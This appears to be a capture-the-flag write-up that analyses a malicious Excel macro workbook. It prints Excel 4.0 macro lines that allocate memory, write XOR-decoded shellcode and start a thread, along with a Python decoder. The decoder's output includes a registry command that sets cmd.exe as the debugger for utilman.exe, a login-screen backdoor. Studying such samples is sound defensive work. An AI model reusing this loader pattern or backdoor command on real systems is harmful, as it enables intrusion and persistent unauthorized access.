First I unzipped the xlsm document and picked it apart in a text editor, looking for interesting stuff in the xml outputs. Found:

```
<mc:Choice Requires="x15"
<x15ac:absPath url="C:\Users\wild\Documents\HTB_Challenges\CA-CTF-2022\free_services\local\" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac"/
</mc:Choice
</mc:AlternateContent
<xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{57578AAA-AC9F-4195-8CF1-0CEC0153C5BD}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/
<bookViews
<workbookView xWindow="-120" yWindow="-120" windowWidth="29040" windowHeight="15840" activeTab="1" xr2:uid="{4430E66F-0907-41B8-9086-199DA6C489AC}"/
[...]
```
in sharedStrings:
```
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2"><si><t>=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)</t></si><si><t>HALT()</t></si></sst>
```
There is also a Macro workbook:

Tried to understand what each line is doing here, took a couple notes:
```
A1=select(E1:G258) - Selects the cells with data
A2=call("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64) - Allocates an amount of bytes
A3=set.value(C1, 0) - Sets C1 to 0 initially
A4=for("counter",0,772,2)   0-772 step 2   (772 bytes in total for E1:G258 (774-2 blank), skip every other!)
A5=set.value(B1,CHAR(BITXOR(active.cell(),24)))   Sets (B1) to a char ( Xor:(active.cell^24)  
A6=call("Kernel32","WriteProcessMemory","JJJCJJ",-1, A2 + C1,β1, LEN(β1), 0) Writes process memory - (Not sure the other stuff?)
A7=set.value(C1, C1 + 1)  Add 1 to C1 for every other step so 386
A8=select(, "RC[2]")    RC[2] is two columns past the current position. (not sure?)
A9=next()
A10=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)  R2C6 is 2 rows down, 6 columns right..
A11=workbook.activate("Sheet1")
HALT()
```
Searched around what this might be doing, so I can figure out the params to CreateThread, etc.  


Found some code that looks oddly similar in the sharpshooter project on github:

https://github.com/mdsecactivebreach/SharpShooter/blob/master/modules/excel4.py

Wow, did not know about Excel 4.0 SYLK files (SLK pre-VBA macros)! Amazing, looks like that is what this is.

Found some basic explanations of what this code is doing here:
https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/

There was a lot more interesting talk about how this can evade AV easily, and I read up on these and SYLK files.. They were still relevant as of 2021 even it appears.. Great stuff to know!

Then I felt comfortable enough to break it down line by line and write some quick python to see what it ends up with before executing.

I saved out the cells E1:G258 as a CSV file in LibreCalc, called it mac.csv.

## mac.py
```
import csv

def readcsv(filename):
 values=[]
 print("Reading file "+filename+":")
 with open(filename, mode='r') as csv_file:
   csv_reader = csv.reader(csv_file)
   line_count = 0
   for row in csv_reader:
     if row:
       for col in row:
         if col:
           #print(col+"\t",end="")
           values.append(col)
     else:
       print("no row\nx")
     line_count += 1
 return values

# A1=select(E1:G258)
# A2=call("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64)
# A3=set.value(C1, 0)
# A4=for("counter",0,772,2)   0-772 step 2   (772 bytes in total for E1:G258 (774-2 blank), skip every other!)
# A5=set.value(B1,CHAR(BITXOR(active.cell(),24)))   Sets (B1) to a char ( Xor:(active.cell^24)
# A6=call("Kernel32","WriteProcessMemory","JJJCJJ",-1, A2 + C1,β1, LEN(β1), 0) Writes process memory -
# A7=set.value(C1, C1 + 1)  Add 1 to C1 for every other step so 386
# A8=select(, "RC[2]")    RC[2] is two columns past the current position.
# A9=next()
# A10=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)  R2C6 is 2 rows down, 6 columns right..
# A11=workbook.activate("Sheet1")

values=[]
bytes=[]
values=readcsv("mac.csv")
for x in range(0,772,2):
 v=values[x]
 b1=chr(int(v)^24)
 bytes.append(b1)

for b in bytes:
 print(b,end='')
```

Ran it, looks good!! Output:

```
Reading file mac.csv:
üè å1ÀdP0R
²Ph1oÿÕ»ðµ¢Vh¦½ûàu»GrojSÿÕREG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f;echo "HTB{1s_th1s_g4l4xy_l0st_1n_t1m3??!}"
```

This one took maybe a couple hours of reading up on this stuff and watching the Derbycon 2018 talk by Stan Hegt, Pieter Ceelen - the 'MS Office Magic Show' - really good stuff!!
